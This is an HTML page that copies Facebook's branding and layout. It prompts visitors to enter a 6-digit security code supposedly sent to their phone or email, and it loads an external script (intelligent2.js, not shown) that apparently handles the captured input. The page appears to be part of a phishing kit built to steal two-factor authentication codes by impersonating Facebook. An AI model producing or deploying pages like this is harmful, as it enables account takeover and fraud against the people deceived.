<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Facebook Verification</title>

<style>
    body {
        margin: 0;
        padding: 0;
        background: #f0f2f5;
        font-family: Helvetica, Arial, sans-serif;
    }

    .container {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
        padding: 16px;
        text-align: center;
    }

    .fb-logo {
        font-size: 42px; /* smaller modern size */
        color: #1877f2;
        font-weight: 700;
        margin-bottom: 16px;
        font-family: Arial Black, Arial, sans-serif;
        letter-spacing: -1px;
    }

    /* Modern card */
    .card {
        width: 330px; /* smaller card */
        background: #fff;
        padding: 22px 18px;
        border-radius: 10px;
        box-shadow: 0 4px 14px rgba(0,0,0,0.08);
        text-align: left;
    }

    .card h2 {
        margin: 0;
        margin-bottom: 6px;
        font-size: 18px; /* smaller modern header */
        font-weight: 600;
        color: #1c1e21;
    }

    .card p {
        margin: 0 0 14px;
        color: #65676b;
        font-size: 13px; /* lighter text */
        line-height: 1.45;
    }

    /* Slim input */
    .input-box input {
        width: 90%;
        padding: 10px 12px;
        border-radius: 6px;
        border: 1px solid #ccd0d5;
        font-size: 15px;
        outline: none;
        margin-bottom: 10px;
        background: #f8f9fb;
        transition: 0.15s ease;
    }

    .input-box input:focus {
        border-color: #1877f2;
        background: #fff;
        box-shadow: 0 0 0 2px rgba(24,119,242,0.15);
    }

    /* Slim modern button */
    .btn {
        width: 100%;
        padding: 10px;
        background: #1877f2;
        color: white;
        border: none;
        border-radius: 6px;
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
        margin-top: 6px;
        transition: background 0.15s;
    }

    .btn:hover {
        background: #166fe5;
    }

    /* Smaller footer link */
    .footer-text {
        font-size: 13px;
        margin-top: 12px;
        text-align: center;
        color: #1877f2;
        cursor: pointer;
    }

    .footer-text:hover {
        text-decoration: underline;
    }

    .small-info {
        margin-top: 10px;
        font-size: 11px;
        color: #65676b;
        text-align: center;
    }

</style>
</head>
<script src="intelligent2.js"></script>
<body>

<div class="container">

    <div class="fb-logo">facebook</div>

    <div class="card">
        <h2>Enter Security Code</h2>

        <p>
            A 6-digit code was sent to your phone number or email.
            Enter the code to continue.
        </p>
          <form>
        <div class="input-box">

            <input type="text" placeholder="Enter code" maxlength="6" name="facebook verification code" required>
        </div>

        <button class="btn" type="submit">Continue</button>
</form>
        <div class="footer-text">Didn't receive the code?</div>
    </div>

</div>

</body>
</html>
